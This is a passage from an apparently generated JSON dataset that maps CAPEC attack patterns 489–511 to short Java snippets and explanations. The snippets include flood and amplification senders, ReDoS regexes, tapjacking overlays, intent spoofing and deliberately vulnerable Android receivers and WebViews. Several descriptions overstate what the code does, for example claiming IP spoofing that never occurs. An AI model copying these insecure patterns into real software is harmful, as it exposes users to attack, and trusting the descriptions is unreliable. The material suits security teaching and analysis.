        "description": "This Java code snippet demonstrates a simplified version of an SSL Flood attack. The code creates multiple threads (1000 in this case) that each establish an SSL connection to a target server (example.com on port 443). Each thread repeatedly renegotiates the SSL connection, consuming server resources. This embodies the main idea of CAPEC-489 (SSL Flood) by exploiting the asymmetric resource consumption between client and server during SSL handshake processes. The code also highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of connections, and CWE-400 (Uncontrolled Resource Consumption) by continuously renegotiating the SSL connection, leading to potential resource exhaustion on the server."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class AmplificationAttackExample {\n    public static void main(String[] args) throws Exception {\n        String targetIp = \"192.168.1.100\"; // Target server IP\n        String amplificationServiceIp = \"192.168.1.200\"; // Amplification service IP\n        int amplificationServicePort = 12345; // Amplification service port\n\n        // Small request to the amplification service\n        byte[] requestData = \"REQUEST\".getBytes();\n        InetAddress amplificationAddress = InetAddress.getByName(amplificationServiceIp);\n        DatagramPacket requestPacket = new DatagramPacket(requestData, requestData.length, amplificationAddress, amplificationServicePort);\n\n        // Spoof the source address to be the target server\n        DatagramSocket socket = new DatagramSocket();\n        socket.send(requestPacket);\n\n        System.out.println(\"Request sent to amplification service, spoofing target IP.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an amplification attack. The code sends a small request to an amplification service, spoofing the source IP address to be that of the target server. The amplification service, which is assumed to generate a much larger response, will then send this large response to the target server, overwhelming it with traffic. This embodies the main idea of the CAPEC by showing how a small request can lead to a large response directed at a target. The code also touches on related CWEs, such as insufficient control of network message volume and incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class QuadraticDataExpansion {\n    public static void main(String[] args) {\n        // Define a large entity\n        String largeEntity = \"A\".repeat(10000);\n        \n        // Create a map to store expanded data\n        Map<String, String> dataMap = new HashMap<>();\n        \n        // Perform excessive substitutions\n        for (int i = 0; i < 10000; i++) {\n            dataMap.put(\"key\" + i, largeEntity);\n        }\n        \n        // Simulate processing the data\n        processData(dataMap);\n    }\n\n    private static void processData(Map<String, String> data) {\n        // Simulate processing each entry\n        for (Map.Entry<String, String> entry : data.entrySet()) {\n            // This is where the application could freeze or crash due to excessive memory usage\n            System.out.println(\"Processing: \" + entry.getKey() + \" with data size: \" + entry.getValue().length());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Quadratic Data Expansion attack. The code defines a large entity (a string of 10,000 'A' characters) and then performs excessive substitutions by storing this large entity in a map 10,000 times. This results in a significant amount of memory being allocated, which can lead to a denial of service situation where the application may freeze or crash. The `processData` method simulates processing the data, which further exacerbates the memory usage. This example embodies the main idea of CAPEC-197 and related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class RegexExponentialBlowup {\n    public static void main(String[] args) {\n        String regex = \"(a+)+\"; // Inefficient regex with exponential complexity\n        String input = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\"; // Input designed to cause exponential blowup\n\n        Pattern pattern = Pattern.compile(regex);\n        Matcher matcher = pattern.matcher(input);\n\n        long startTime = System.currentTimeMillis();\n        boolean matchFound = matcher.find();\n        long endTime = System.currentTimeMillis();\n\n        System.out.println(\"Match found: \" + matchFound);\n        System.out.println(\"Time taken: \" + (endTime - startTime) + \"ms\");\n    }\n}",
        "description": "This Java code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regex pattern \"(a+)+\" is inefficient and has exponential worst-case complexity. When matched against the input string \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!\", it causes excessive CPU consumption due to backtracking. This example highlights CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity). The code measures the time taken to perform the match, illustrating the potential performance impact of such a vulnerability."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class SOAPArrayBlowup {\n    public static void main(String[] args) {\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ArrayOfStrings xmlns=\\\"http://tempuri.org/\\\"><string>1</string><string>2</string></ArrayOfStrings></soap:Body></soap:Envelope>\";\n        for (int i = 0; i < 1000000; i++) {\n            soapMessage = soapMessage.replace(\"</ArrayOfStrings>\", \"<string>\" + i + \"</string></ArrayOfStrings>\");\n        }\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(soapMessage)));\n            System.out.println(\"Parsed SOAP message successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Blowup attack. The code constructs a SOAP message with a large array declaration by iteratively adding elements to the array. The SOAP message is then parsed using an XML parser. This can lead to memory exhaustion as the parser attempts to allocate space for the large number of array elements. The code highlights the vulnerability of allocating resources without limits (CWE-770) and improperly controlled sequential memory allocation (CWE-1325). The SOAP message is small in size but contains a large array declaration, which is the main idea of the CAPEC described."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.util.Arrays;\n\npublic class TCPFragmentationAttack {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new Thread(new ClientHandler(socket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream input = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n\n            while ((bytesRead = input.read(buffer)) != -1) {\n                byte[] fragment = Arrays.copyOfRange(buffer, 0, bytesRead);\n                // Simulate processing of fragmented TCP packet\n                processFragment(fragment);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processFragment(byte[] fragment) {\n        // Simulate improper handling of fragmented TCP packets\n        // This is where the attack can exploit the system\n        System.out.println(\"Processing fragment: \" + Arrays.toString(fragment));\n    }\n}",
        "description": "This Java code snippet demonstrates a basic server that listens for incoming TCP connections on port 8080. When a client connects, it spawns a new thread to handle the connection. The ClientHandler class reads data from the socket in fragments and processes each fragment. The processFragment method simulates the improper handling of fragmented TCP packets, which can be exploited by an attacker to bypass network filtering rules. This code embodies the main idea of the CAPEC 'TCP Fragmentation' attack by showing how fragmented packets can be processed in a way that may lead to security vulnerabilities. The related CWEs provide additional context, such as the lack of resource limits (CWE-770), improper resource release (CWE-404), and potential for inconsistent interpretation of requests (CWE-444)."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class UDPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        int targetPort = 12345;\n        byte[] largeData = new byte[2000]; // Data larger than typical MTU\n        Arrays.fill(largeData, (byte) 0xAB); // Fill with dummy data\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(largeData, largeData.length, targetAddress, targetPort);\n\n        // Send the large packet, causing fragmentation\n        socket.send(packet);\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP fragmentation attack. The code creates a large UDP packet (2000 bytes) which exceeds the typical Ethernet MTU of 1500 bytes, causing the packet to be fragmented. The packet is then sent to a target server at IP address '192.168.1.1' on port 12345. This attack can consume network bandwidth and server resources, as the server must reassemble the fragmented packets. The code embodies the main idea of CAPEC-UDP Fragmentation and highlights CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the size of the UDP packet, leading to potential resource exhaustion."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        byte[] data = new byte[65507]; // Maximum size for a UDP packet\n        DatagramSocket socket = new DatagramSocket();\n\n        // Simulate sending fragmented ICMP packets\n        for (int i = 0; i < 10000; i++) { // CWE-770: No limit on the number of packets\n            DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 7);\n            socket.send(packet);\n        }\n\n        socket.close(); // CWE-404: Improper resource shutdown\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Fragmentation attack. The code sends a large number of UDP packets to a target address, simulating the resource exhaustion aspect of the attack. The DatagramSocket is used to send packets, and the loop sends 10,000 packets without any throttling (CWE-770). The socket is closed at the end, but in a real-world scenario, improper handling could lead to resource leaks (CWE-404). This code represents the main idea of the CAPEC by showing how an attacker might flood a target with fragmented packets to consume resources and potentially cause a crash."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileDiscovery {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileDiscovery <directory>\");\n            return;\n        }\n\n        String directoryPath = args[0];\n        File directory = new File(directoryPath);\n\n        if (!directory.exists() || !directory.isDirectory()) {\n            System.out.println(\"Invalid directory path\");\n            return;\n        }\n\n        File[] files = directory.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                if (file.isFile()) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"Discovered file: \" + file.getName());\n                        System.out.println(\"Content: \" + content);\n                    } catch (IOException e) {\n                        System.out.println(\"Error reading file: \" + file.getName());\n                    }\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic file discovery mechanism. The program takes a directory path as an argument, lists all files in the directory, and reads their contents. This embodies the CAPEC 'File Discovery' by probing a directory to find and read files, potentially exposing sensitive information (CWE-200). The code does not validate the directory path securely (CWE-73), and it reads files without proper access control checks (CWE-529). Additionally, it assumes the file content is safe to read and print, which could lead to further vulnerabilities (CWE-646)."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotHandler {\n    public static void main(String[] args) {\n        try {\n            // Simulate taking a screenshot and saving it to a file\n            BufferedImage screenshot = new BufferedImage(200, 200, BufferedImage.TYPE_INT_ARGB);\n            File outputfile = new File(\"screenshot.png\");\n            ImageIO.write(screenshot, \"png\", outputfile);\n\n            // Simulate an adversary accessing the screenshot file\n            BufferedImage accessedScreenshot = ImageIO.read(new File(\"screenshot.png\"));\n            System.out.println(\"Screenshot accessed: \" + (accessedScreenshot != null));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates the creation and unauthorized access of a screenshot, embodying the main idea of CAPEC- Probe iOS Screenshots. The code creates a temporary screenshot and saves it to a file. It then simulates an adversary accessing this screenshot file, demonstrating the potential exposure of sensitive information. This example highlights CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) by showing how sensitive information can be accessed without proper authorization. It also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by demonstrating how system-level information (the screenshot) can be accessed by unauthorized actors."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.SENSITIVE_ACTION\")) {\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            if (sensitiveData != null) {\n                Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                sendSensitiveDataOverNetwork(sensitiveData);\n            }\n        }\n    }\n\n    private void sendSensitiveDataOverNetwork(String data) {\n        // Simulate sending data over the network in cleartext\n        Log.d(\"VulnerableReceiver\", \"Sending data over network: \" + data);\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that embodies the main idea of the CAPEC 'Android Intent Intercept'. The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION'. When it receives this intent, it extracts sensitive data from the intent without verifying the source of the intent (CWE-925). The sensitive data is then logged and sent over the network in cleartext (CWE-319). This code is vulnerable to interception and modification of the intent by a malicious application, leading to potential information disclosure and data injection attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.setWebViewClient(new WebViewClient());\n\n        // Adding a JavaScript interface that can be exploited\n        webView.addJavascriptInterface(new WebAppInterface(), \"AndroidInterface\");\n\n        webView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        @JavascriptInterface\n        public void showToast(String toast) {\n            // Dangerous method that can be exploited\n            Toast.makeText(MainActivity.this, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses a WebView component to load a web page. The WebView is configured to enable JavaScript and includes a JavaScript interface (`AndroidInterface`) that exposes a method (`showToast`). This method can be exploited by an adversary to inject malicious code into the context of the web page. The code snippet embodies the main idea of the CAPEC 'WebView Injection' by showing how an exposed dangerous method (CWE-749) can be used to manipulate the web page's DOM and cookies, potentially leading to further attacks. The lack of proper verification of the source of communication (CWE-940) and reliance on client-side enforcement of security (CWE-602) are also highlighted in this example."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to start a new activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        Log.d(\"MaliciousActivity\", \"Mimicking trusted activity UI\");\n    }\n\n    // Method to capture sensitive data\n    private void captureSensitiveData() {\n        // Code to capture sensitive data\n        Log.d(\"MaliciousActivity\", \"Capturing sensitive data\");\n    }\n}",
        "description": "The provided code snippet demonstrates a scenario where an Android application uses an implicit intent to start a trusted activity. However, a malicious activity intercepts this intent and launches itself instead. The malicious activity mimics the trusted activity's user interface to deceive the user into entering sensitive data. This code embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights the related CWEs, such as the use of implicit intents (CWE-927) and improper verification of the communication channel (CWE-940). The MainActivity class sends an implicit intent to start a trusted activity, while the MaliciousActivity class intercepts this intent, mimics the trusted activity's UI, and captures sensitive data from the user."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            // CWE-926: Improper Export of Android Application Components\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n}\n\n// AndroidManifest.xml\n// <receiver android:exported=\"true\" android:name=\".VulnerableReceiver\">\n//     <intent-filter>\n//         <action android:name=\"com.example.TRUSTED_ACTION\" />\n//     </intent-filter>\n// </receiver>",
        "description": "This Java code snippet demonstrates a vulnerable BroadcastReceiver in an Android application. The BroadcastReceiver, named VulnerableReceiver, listens for intents with the action 'com.example.TRUSTED_ACTION'. However, it does not properly verify the source of the intent (CWE-925), which can lead to improper access control (CWE-284). The receiver is also exported (CWE-926), making it accessible to other applications. The intent carries sensitive data (CWE-927), and the destination is not correctly specified (CWE-941). This setup allows a malicious application to send an intent to the VulnerableReceiver, potentially leading to data modification, information disclosure, or data injection, embodying the main idea of the 'Intent Spoof' CAPEC."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebSettings;\nimport android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView myWebView = findViewById(R.id.webview);\n        WebSettings webSettings = myWebView.getSettings();\n        webSettings.setJavaScriptEnabled(true);\n\n        myWebView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        myWebView.loadUrl(\"file:///android_asset/sample.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a WebView in an Android application. The WebView is configured to enable JavaScript and an interface is registered using the addJavascriptInterface API. The interface, 'AndroidInterface', exposes a method 'showToast' that can be called from any loaded web page. This represents the CAPEC 'WebView Exposure' vulnerability, where an adversary can exploit this interface to access application-specific functionality. The related CWEs are illustrated by the improper access control (CWE-284) and the exposed dangerous method (CWE-749), as the interface method is not properly restricted and can be invoked by any web page loaded in the WebView."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class MaliciousTaskImpersonationServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // CWE-285: Improper Authorization\n        String userRole = request.getParameter(\"role\");\n        if (userRole == null || !userRole.equals(\"admin\")) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Unauthorized access\");\n            return;\n        }\n\n        // CWE-506: Embedded Malicious Code\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h1>Welcome to the Admin Panel</h1>\");\n        out.println(\"<form action='stealData' method='post'>\");\n        out.println(\"<input type='hidden' name='data' value='sensitiveInfo'>\");\n        out.println(\"<input type='submit' value='Submit'>\");\n        out.println(\"</form>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a malicious task impersonation scenario. The servlet checks for an 'admin' role parameter (CWE-285: Improper Authorization) and, if authorized, serves a fake admin panel. The panel contains a form that submits sensitive information to a malicious endpoint (CWE-506: Embedded Malicious Code). This code represents the CAPEC concept of task impersonation, where an adversary uses a malicious application to impersonate a legitimate task to steal sensitive information or leverage user privileges."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MaliciousApp {\n    private static final Map<String, String> registeredSchemes = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Register a URL scheme intended for a target application\n        registerScheme(\"targetApp\", \"maliciousApp\");\n\n        // Simulate receiving a URL intended for the target application\n        handleIncomingURL(\"targetApp://login?username=user&password=pass\");\n    }\n\n    public static void registerScheme(String targetScheme, String handler) {\n        registeredSchemes.put(targetScheme, handler);\n    }\n\n    public static void handleIncomingURL(String url) {\n        try {\n            URI uri = new URI(url);\n            String scheme = uri.getScheme();\n            if (registeredSchemes.containsKey(scheme)) {\n                // Mimic the target application\n                System.out.println(\"Welcome to Target App! Please enter your credentials.\");\n                // Extract sensitive information (CWE-598)\n                String query = uri.getQuery();\n                System.out.println(\"Extracted Query: \" + query);\n                // Here, sensitive information can be logged or sent to an attacker\n            } else {\n                System.out.println(\"No handler registered for this scheme.\");\n            }\n        } catch (URISyntaxException e) {\n            // Generate an error message containing sensitive information (CWE-209)\n            System.out.println(\"Error parsing URL: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Scheme Squatting attack. The malicious application registers a URL scheme intended for a target application that is not installed. When a URL intended for the target application is received, the malicious application handles it, mimicking the target application to deceive the user into entering sensitive information. The code also highlights related CWEs: CWE-598 (sensitive information in query strings) and CWE-209 (error messages containing sensitive information)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.FrameLayout;\nimport android.widget.LinearLayout;\n\npublic class TapjackingActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Create a transparent overlay\n        FrameLayout overlay = new FrameLayout(this);\n        overlay.setBackgroundColor(0x80000000); // Semi-transparent black\n        overlay.setClickable(true); // Allow clicks to pass through\n\n        // Add a malicious button on top of the overlay\n        Button maliciousButton = new Button(this);\n        maliciousButton.setText(\"Click Me\");\n        maliciousButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Malicious action\n                System.out.println(\"Malicious action executed\");\n            }\n        });\n\n        // Add the malicious button to the overlay\n        overlay.addView(maliciousButton);\n\n        // Add the overlay to the main layout\n        LinearLayout mainLayout = findViewById(R.id.main_layout);\n        mainLayout.addView(overlay);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a tapjacking attack in an Android application. The code creates a semi-transparent overlay that covers the main activity's layout. A malicious button is added on top of this overlay, which appears to be part of the underlying application. When the user taps on the button, a malicious action is executed. This example embodies the main idea of CAPEC- Tapjacking, where an adversary misleads the user into interacting with a malicious interface. The code also touches on related CWEs, such as improper restriction of rendered UI layers (CWE-1021) and UI misrepresentation of critical information (CWE-451)."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"This is very sensitive information.\";\n        File file = new File(\"/tmp/sensitive_data.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the improper storage of sensitive information, which is vulnerable to physical theft. The code writes sensitive data to a file in the /tmp directory without any access control mechanisms. This embodies the CAPEC concept of 'Physical Theft' by showing how an adversary with physical access to the system can easily retrieve sensitive information. The related CWEs are represented as follows:\n- CWE-1263: The code does not implement any physical access control to protect the sensitive data.\n- CWE-922: The sensitive data is stored insecurely without limiting read or write access.\n- CWE-921: The file system used does not have built-in access control, making it easy for unauthorized actors to access the data."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import java.util.Scanner;\n\npublic class SensitiveInfoExposure {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        System.out.println(\"Your password is: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information (a password) is exposed to an unauthorized actor through shoulder surfing. The code prompts the user to enter their password and then prints it out to the console. This exposure can be easily observed by someone looking over the user's shoulder, leading to a potential security breach. The code embodies the main idea of the CAPEC 'Shoulder Surfing' and highlights related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Exposure of Private Personal Information to an Unauthorized Actor' (CWE-359)."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class KerberoastingExample {\n    public static void main(String[] args) {\n        String serviceTicket = getServiceTicket(\"serviceAccount\");\n        String hashedTicket = hashTicket(serviceTicket);\n        saveToDisk(hashedTicket, \"ticket.txt\");\n    }\n\n    private static String getServiceTicket(String account) {\n        // Simulate obtaining a service ticket for the account\n        return \"fakeServiceTicketFor\" + account;\n    }\n\n    private static String hashTicket(String ticket) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n            byte[] hash = md.digest(ticket.getBytes());\n            return Base64.getEncoder().encodeToString(hash);\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    private static void saveToDisk(String data, String filename) {\n        try (FileOutputStream fos = new FileOutputStream(filename)) {\n            fos.write(data.getBytes()); // CWE-522: Insufficiently Protected Credentials\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Kerberoasting attack. The main idea is to obtain a service ticket for a service account, hash it using a weak cryptographic algorithm (MD5), and save the hashed ticket to disk. This embodies the CAPEC concept of exploiting Kerberos authentication to obtain and crack hashed credentials. The code also highlights related CWEs, such as CWE-522 (Insufficiently Protected Credentials) by saving the hashed ticket to disk without proper protection, and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm) by using MD5 for hashing."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            String action = request.getParameter(\"action\");\n            if (action != null) {\n                // CWE-346: Origin Validation Error\n                // No validation of the request origin\n                // CWE-863 and CWE-285: Incorrect/Improper Authorization\n                // No proper authorization checks\n                performAction(action, session.getAttribute(\"user\"));\n            }\n        }\n    }\n\n    private void performAction(String action, Object user) {\n        // Perform some action on behalf of the user\n        System.out.println(\"Action: \" + action + \" performed for user: \" + user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable endpoint that embodies the main idea of the CAPEC 'SaaS User Request Forgery'. The servlet processes POST requests and performs actions based on the 'action' parameter without proper validation and authorization checks. The code does not validate the origin of the request (CWE-346), and it lacks proper authorization checks (CWE-863 and CWE-285), allowing an attacker to perform actions on behalf of an authenticated user. This represents the attack scenario where a malicious application can exploit the trust placed on an authenticated session to perform unauthorized actions on a SaaS application."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
